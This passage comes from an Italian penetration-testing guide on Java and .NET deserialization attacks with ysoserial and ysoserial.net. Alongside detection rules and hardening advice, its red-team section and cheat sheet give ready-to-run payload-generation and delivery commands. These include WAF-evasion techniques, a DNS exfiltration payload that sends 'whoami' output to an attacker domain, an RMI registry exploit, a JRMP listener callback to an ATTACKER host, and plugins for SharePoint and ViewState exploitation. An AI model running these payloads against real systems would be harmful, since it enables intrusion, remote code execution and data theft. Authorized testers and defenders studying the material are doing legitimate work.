#### WAF Rules

```
# ModSecurity / OWASP CRS custom rule
SecRule REQUEST_BODY "@rx rO0AB" \
  "id:9001,phase:2,deny,status:400,msg:'Java Deserialization Payload'"

SecRule REQUEST_BODY "@rx AAEAAAD/////" \
  "id:9002,phase:2,deny,status:400,msg:'.NET BinaryFormatter Payload'"
```

#### JNDI e DNS Monitoring

```bash
# Monitora query DNS anomale da server applicativo (segno di URLDNS/gadget)
# nei log del resolver interno cerca:
# - query verso domini esterni da host che non dovrebbero navigare
# - query verso *.oast.fun, *.burpcollaborator.net, *.interactsh.com

# Zeek/Bro: alert su query DNS inusuali da server Java
```

#### Java Deserialization Agent (JVM-level)

Installa un **Java Agent** di detection sulla JVM per intercettare le chiamate `readObject()` in runtime:

* **SerialKiller** (ikkisoft/SerialKiller): whitelist/blacklist delle classi deserializzabili
* **Contrast Security**: agent commerciale con alerting
* **RASP (Runtime Application Self-Protection)**: Sqreen, Imperva RASP

```bash
# SerialKiller come Java Agent
java -javaagent:/path/to/serialkiller.jar \
  -Dserializer.config=/path/to/serialkiller.conf \
  -jar application.jar
```

#### Log Analysis

```bash
# Cerca pattern sospetti nei log applicativi
grep -i "ClassNotFoundException\|InvalidClassException\|readObject\|StreamCorruptedException" \
  /var/log/app/*.log

# Cerca stack trace da gadget chain noti
grep -i "CommonsCollections\|BeanUtils\|InvokerTransformer\|ChainedTransformer" \
  /var/log/app/*.log
```

### Red Team: OPSEC e Evasion

#### Evita WAF con Encoding

```bash
# URL-encode il payload binario
java -jar ysoserial.jar CommonsCollections1 'id' | python3 -c \
  "import sys,urllib.parse; data=sys.stdin.buffer.read(); print(urllib.parse.quote(data))"

# Invia con content-type legit se il WAF filtra per content-type
curl -X POST http://target/api/data \
  --data-binary @payload.bin \
  -H "Content-Type: application/octet-stream"
```

#### Chunked Transfer Encoding (WAF Bypass)

```bash
# Invia il payload in chunks per eludere inspection a stream intero
curl -X POST http://target/deserialize \
  --data-binary @payload.bin \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-java-serialized-object"
```

#### Gadget Chain Obfuscation

Per ambienti con JVM security manager attivo o SerialKiller, usa chain meno note come **Jdk7u21** (nessuna dipendenza esterna) o **ROME** invece delle CC più bloccate.

#### DNS-only Exfiltration

Se il firewall blocca le connessioni outbound ma permette DNS, usa URLDNS per esfiltrare dati:

```bash
# Exfiltrazione tramite subdomain DNS (encoded)
# Es: {whoami_output}.yourdomain.com
java -jar ysoserial.jar URLDNS \
  'http://$(whoami).exfil.yourdomain.com' > exfil.bin
```

***

## Toolchain Comparison

| Tool                                  | Linguaggio Target | Approccio                       | Automazione  | Note                           |
| ------------------------------------- | ----------------- | ------------------------------- | ------------ | ------------------------------ |
| **ysoserial**                         | Java              | Gadget chain manuali            | Semi-manuale | Standard de facto, 34 chain    |
| **ysoserial.net**                     | .NET              | Gadget chain + plugin           | Semi-manuale | Copre tutti i formatter .NET   |
| **marshalsec**                        | Java/JSON         | JSON gadget (Jackson, Fastjson) | Semi-manuale | Complementa ysoserial per JSON |
| **Burp Java Deserialization Scanner** | Java              | Scan automatico                 | Automatico   | Usa ysoserial internamente     |
| **GadgetProbe**                       | Java              | Classpath fingerprint           | Automatico   | Identifica librerie presenti   |
| **DeserLab**                          | Java              | Lab di test                     | —            | Ambienti vulnerabili locali    |
| **ysoserial-payloads**                | Java              | Extended payloads               | Semi-manuale | Fork con chain aggiuntive      |
| **Freddy (Burp extension)**           | Java + .NET       | Scan passivo/attivo             | Automatico   | Copre JSON/XML/Binary          |

***

## Troubleshooting

| Problema                                          | Causa Probabile                                | Soluzione                                                                      |
| ------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------ |
| `Error while generating or serializing payload`   | Dipendenza Maven mancante nel build            | Ricompila con `mvn clean package -DskipTests` e verifica il pom.xml            |
| Payload non causa esecuzione, nessun errore       | Gadget chain sbagliata per il classpath target | Usa URLDNS prima per confermare; poi prova gadget diversi                      |
| DNS callback non arriva                           | Firewall egress blocca DNS / porta             | Usa HTTP callback come alternativa; verifica che il server possa risolvere DNS |
| `ClassNotFoundException` nello stack trace        | La libreria del gadget non è nel classpath     | Stack trace rivela il classpath reale → scegli un gadget compatibile           |
| `InvalidClassException: local class incompatible` | Versione diversa della libreria nel target     | Prova versioni alternative del gadget (es. CC1 vs CC2 vs CC3)                  |
| ysoserial.net: `no gadget found`                  | Formatter non supporta quel gadget             | Usa `--sf [Formatter]` per cercare gadget compatibili                          |
| ViewState payload rifiutato                       | MAC validation fallisce                        | Verifica che la chiave sia corretta; usa `--islegacy` per .NET 2.0             |
| Payload troppo grande per il parametro            | Limiti di dimensione WAF/app                   | Usa `--minify --ust` con ysoserial.net; considera chain più corte              |
| Output del comando non visibile                   | Blind RCE                                      | Usa DNS/HTTP callback (interactsh, Burp Collaborator)                          |

***

## FAQ

**Devo avere la stessa versione di Java del target?**
Generalmente no. ysoserial genera payload compatibili con JVM ≥ 1.6. Il gadget **Jdk7u21** richiede che il target usi JDK ≤ 7u21. Per gli altri gadget, la versione della libreria nel classpath del target è più importante della versione JVM locale.

**Come capisco quale libreria è nel classpath del target?**
Ci sono tre modi: (1) stack trace di errori che rivelano package name e versioni; (2) analisi del file WAR/EAR se accessibile (`/WEB-INF/lib/`); (3) **GadgetProbe** che usa DNS callback per fingerprint automatico del classpath.

**ysoserial funziona su Java 17+?**
ysoserial stesso gira su Java 17+ con alcune limitazioni (moduli JPMS). Per alcuni gadget, il target deve usare Java \< 17 a causa di restriction sui moduli. Usa la flag `--add-opens` nel JVM del target se possibile.

**Cos'è ysoserial urldns e perché Google lo suggerisce?**
`ysoserial urldns` indica l'uso del gadget **URLDNS** di ysoserial. È la ricerca più comune perché URLDNS è il gadget universale (nessuna dipendenza) usato come primo probe per verificare la vulnerabilità senza side effects — da qui l'alto volume di ricerca rispetto agli altri gadget.

**ysoserial funziona anche per Kotlin/Groovy?**
Sì, qualsiasi applicazione JVM (Kotlin, Groovy, Scala) che deserializza oggetti Java è potenzialmente vulnerabile. Le classi del gadget chain sono Java standard; il linguaggio dell'applicazione non importa.

**ViewState è sempre vulnerabile in ASP.NET?**
No. ASP.NET 4.5+ abilita per default MAC protection del ViewState. La vulnerabilità esiste quando: (1) la `validationKey` è debole/predefinita/trapelata; (2) `enableViewStateMac="false"` è configurato manualmente; (3) si usa .NET 2.0/3.5 senza patch.

**Qual è la differenza tra ysoserial e marshalsec?**
ysoserial si concentra su gadget chain per `ObjectInputStream` Java (BinaryFormatter Java). marshalsec si concentra su gadget chain per serializzatori JSON/XML come Jackson, Fastjson, XStream. In un pentest completo si usano entrambi.

***

## Cheat Sheet

```bash
# ============================================================
# YSOSERIAL - JAVA DESERIALIZATION CHEAT SHEET
# ============================================================

# BUILD
mvn clean package -DskipTests                        # Compila
java -jar ysoserial.jar                              # Lista gadget

# PROBE (no side effects, no dipendenze)
java -jar ysoserial.jar URLDNS 'http://ID.oast.fun' > probe.bin

# GADGET CHAIN COMUNI
java -jar ysoserial.jar CommonsCollections1 'id' > cc1.bin   # CC 3.1
java -jar ysoserial.jar CommonsCollections2 'id' > cc2.bin   # CC4
java -jar ysoserial.jar CommonsCollections6 'id' > cc6.bin   # CC 3.1 (bypass)
java -jar ysoserial.jar CommonsBeanutils1 'id' > cb1.bin     # BeanUtils (Jenkins)
java -jar ysoserial.jar Spring1 'id' > spring1.bin           # Spring Framework
java -jar ysoserial.jar Jdk7u21 'id' > jdk7.bin              # JDK <= 7u21 (no deps)
java -jar ysoserial.jar ROME 'id' > rome.bin                 # rome:1.0

# OUTPUT BASE64
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# INVIO HTTP
curl -X POST http://TARGET/endpoint \
  --data-binary @payload.bin \
  -H "Content-Type: application/x-java-serialized-object"

# RMI REGISTRY EXPLOIT
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit \
  TARGET 1099 CommonsCollections1 'id'

# JRMP LISTENER + CLIENT
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
java -jar ysoserial.jar JRMPClient 'ATTACKER:1099' > jrmp_client.bin

# ============================================================
# YSOSERIAL.NET - .NET DESERIALIZATION CHEAT SHEET
# ============================================================

# LISTA GADGET PER FORMATTER
.\ysoserial.exe --sf BinaryFormatter
.\ysoserial.exe --sf Json.Net

# GADGET CHAIN COMUNI .NET
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "whoami"
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "whoami"
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "whoami" -t
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -o raw -c "whoami"
.\ysoserial.exe -f BinaryFormatter -g ClaimsPrincipal -o base64 -c "whoami"

# MINIFY
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c "whoami" --minify --ust

# TEST LOCALE
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

# STDIN PER COMANDI LUNGHI
cat command.txt | .\ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s

# TUTTI I GADGET PER UN FORMATTER (test massivo)
.\ysoserial.exe --raf -f BinaryFormatter -c "calc" -t

# PLUGIN
.\ysoserial.exe -p DotNetNuke -m run_command -c "whoami"
.\ysoserial.exe -p SharePoint --cve CVE-2019-0604 -c "whoami"
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami" --apppath "/"

# ============================================================
# DETECTION MAGIC BYTES
# ============================================================
# Java Serialized Object:  AC ED 00 05  |  Base64: rO0AB
# .NET BinaryFormatter:    00 01 00 00 00 FF FF FF FF  |  Base64: AAEAAAD/////
# Python Pickle:           80 02 (o 80 04, 80 05)
# PHP Serialized:          O: / a: / s: (testo)

# Check rapido con xxd
echo "BASE64PAYLOAD==" | base64 -d | xxd | head -2
```

***

## Perché la Deserializzazione è Critica nel 2026

Nonostante la vulnerabilità sia nota dal 2015, la deserializzazione insicura rimane una delle bug class più frequenti e pericolose per diversi motivi:

**Legacy code difficile da rimuovere.** Migliaia di applicazioni enterprise usano ancora `BinaryFormatter` in .NET e `ObjectInputStream` in Java. Riscrivere il layer di serializzazione in un sistema in produzione da 15 anni è costoso e rischioso.

**Classpath sempre più grande.** Le applicazioni moderne includono centinaia di dipendenze Maven/NuGet. Ogni libreria aggiuntiva aumenta la superficie dei gadget disponibili. Il progetto **GadgetInspector** (presentato a Black Hat 2018) ha dimostrato come l'analisi automatica del bytecode può scoprire nuove chain automaticamente.

**Cloud e microservizi.** I broker di messaggi (Kafka, RabbitMQ, ActiveMQ), le code di task (Celery, Sidekiq), i sistemi di caching (Redis con object serialization) e le API gRPC con serializzatori custom sono tutti potenziali vettori.

**CVE continuano ad emergere.** WebLogic (CVE-2023-21839), Spring Framework, Apache Shiro (CVE-2016-4437 e successive), Apache Commons Email — ogni anno escono nuove CVE di deserializzazione su prodotti enterprise.

**ViewState e WebForms nel 2026.** Nonostante ASP.NET Core, milioni di applicazioni WebForms legacy sono ancora in produzione. La ViewState senza MAC protection o con chiave estratta è un vettore di RCE immediato.

***

## Hardening e Mitigazione

### Java: Blocca la Deserializzazione Insicura

#### Usa SerialKiller come Java Agent

```xml
<!-- serialkiller.conf -->
<config>
  <refresh>6000</refresh>
  <mode>REJECT</mode>
  <blacklist>
    <regExp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regExp>
    <regExp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regExp>
    <regExp>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$</regExp>
    <regExp>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$</regExp>
    <regExp>org\.codehaus\.groovy\.runtime\.ConvertedClosure$</regExp>
    <regExp>org\.codehaus\.groovy\.runtime\.MethodClosure$</regExp>
    <regExp>org\.springframework\.beans\.factory\.ObjectFactory$</regExp>
    <regExp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regExp>
    <regExp>bsh\.XThis$</regExp>
    <regExp>bsh\.Interpreter$</regExp>
  </blacklist>
  <whitelist>
    <regExp>java\.lang\.*</regExp>
    <regExp>java\.util\.*</regExp>
    <regExp>com\.myapp\.*</regExp>
  </whitelist>
</config>
```

#### Java 9+ Serialization Filters (JEP 290)

```java
// Configura un filter globale sulla JVM
// In jvm.options o come system property
// -Djdk.serialFilter=com.myapp.*;!*

// Oppure programmaticamente
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.*;java.lang.*;java.util.*;!*"
);
ObjectInputFilter.Config.setSerialFilter(filter);
```

#### Sostituisci ObjectInputStream con un'alternativa sicura

```java
// Invece di ObjectInputStream, usa librerie sicure:
// - Jackson con typeinfo disabilitato
// - Protocol Buffers (protobuf)
// - Apache Avro
// - JSON nativo (senza polimorfismo)

// Se devi usare Java serialization, almeno implementa
// un custom ObjectInputStream che filtra le classi:
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "com.myapp.dto.UserDTO",
        "com.myapp.dto.OrderDTO"
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws ClassNotFoundException, IOException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidClassException("Blocked: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

### .NET: Disabilita BinaryFormatter

Microsoft ha deprecato `BinaryFormatter` a partire da .NET 5 e lo ha rimosso in .NET 9. In .NET 8+ è disabilitato per default.

```csharp
// .NET 5+: BinaryFormatter disabilitato per default
// Per riabilitarlo (SCONSIGLIATO):
// In runtimeconfig.json:
// "configProperties": {
//   "System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization": true
// }

// MIGRAZIONE: sostituisci BinaryFormatter con alternativa sicura
// PRIMA (insicuro):
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);  // VULNERABLE

// DOPO (sicuro con System.Text.Json):
var obj = System.Text.Json.JsonSerializer.Deserialize<MyDto>(stream);
```

### .NET: Json.NET — Disabilita TypeNameHandling

```csharp
// INSICURO - permette gadget chain
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // VULNERABILE
};

// SICURO - disabilita type name handling
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None  // DEFAULT SICURO
};

// Se hai bisogno di polimorfismo, usa SerializationBinder personalizzato:
settings.SerializationBinder = new SafeSerializationBinder(allowedTypes);
```

### .NET: ViewState — Proteggi la Machine Key

```xml
<!-- web.config: Machine Key FORTE e casuale -->
<system.web>
  <machineKey
    validationKey="[64+ byte hex casuali - NON usare AutoGenerate in web farm]"
    decryptionKey="[32+ byte hex casuali]"
    validation="HMACSHA256"
    decryption="AES" />

  <!-- Abilita MAC su ViewState (default true in .NET 4.5+) -->
  <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
</system.web>
```

### Aggiornamento Librerie Vulnerabili

```bash
# Java: verifica versioni CC nel pom.xml
grep -r "commons-collections" pom.xml
# Aggiorna a commons-collections 3.2.2+ o 4.1+

# Maven dependency check (OWASP)
mvn org.owasp:dependency-check-maven:check

# .NET: NuGet audit
dotnet list package --vulnerable
```

***

## Disclaimer Legale

Le tecniche descritte in questa guida — generazione di payload di deserializzazione con ysoserial e ysoserial.net, test di endpoint RMI, exploit di ViewState — sono **strumenti legali esclusivamente in contesti autorizzati**:

* Ambienti di penetration test con contratto firmato e scope definito
* Piattaforme CTF (Hack The Box, TryHackMe, PicoCTF, RootMe)
* Laboratori locali e ambienti di test personali (VulnHub, DVWA, WebGoat)
* Programmi di Bug Bounty con scope esplicito che include l'endpoint testato

L'uso non autorizzato di questi strumenti costituisce reato ai sensi del **D.Lgs. 231/2001 (art. 24bis)** in Italia, del **Computer Fraud and Abuse Act (CFAA)** negli USA e del **Computer Misuse Act** nel UK.

**Risorse tecniche di riferimento:**

* [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
* [frohoff/ysoserial](https://github.com/frohoff/ysoserial) — Marshalling Pickles (AppSec 2015)
* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)
* [NCC Group: Java Deserialization Vulnerabilities](https://www.nccgroup.com/us/research/java-deserialization-vulnerabilities-the-forgotten-bug-class/)
* JEP 290: [Enhanced Serialization Filtering](https://openjdk.org/jeps/290)
* Microsoft: [BinaryFormatter migration guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/)

***

## Supporta Hackita.it

Hackita.it è il progetto di un singolo professionista. Se questa guida ti ha aiutato in un CTF, in una lab session o in un assessment autorizzato, considera di supportare il progetto:

* ☕ [Offrimi un caffè su Ko-fi](https://ko-fi.com/hackita)
* 🛍️ [Shop ufficiale](https://shop.hackita.it) — gadget e materiale Hackita
* 📨 Per consulenze e penetration test: [info@hackita.it](mailto:info@hackita.it)
* 💼 LinkedIn: [Canio Campaniello](https://www.linkedin.com/in/canio-campaniello-525152407)
